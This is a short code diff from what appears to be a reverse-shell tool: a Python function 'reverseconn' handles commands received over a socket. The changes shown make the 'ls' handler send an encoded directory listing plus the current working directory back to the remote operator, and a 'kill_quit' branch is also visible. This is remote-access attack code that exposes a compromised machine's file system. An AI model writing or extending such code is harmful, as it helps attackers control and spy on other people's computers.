@@ -83,7 +83,7 @@ def reverseconn():
 
         elif RevNet.dec(recvcmd.decode("utf-8"))=="ls":
 
-            dirs=os.listdir()
+            dirs=os.listdir('.')
 
             buf=''
 
@@ -91,7 +91,7 @@ def reverseconn():
 
                 buf+=d+'\n'
 
-            RevNet.send_all(s,str.encode(RevNet.enc(buf)))
+            RevNet.send_all(s,str.encode(RevNet.enc(buf+'`'+str(os.getcwd())+'>')))
 
         elif RevNet.dec(recvcmd.decode("utf-8"))=="kill_quit":
 
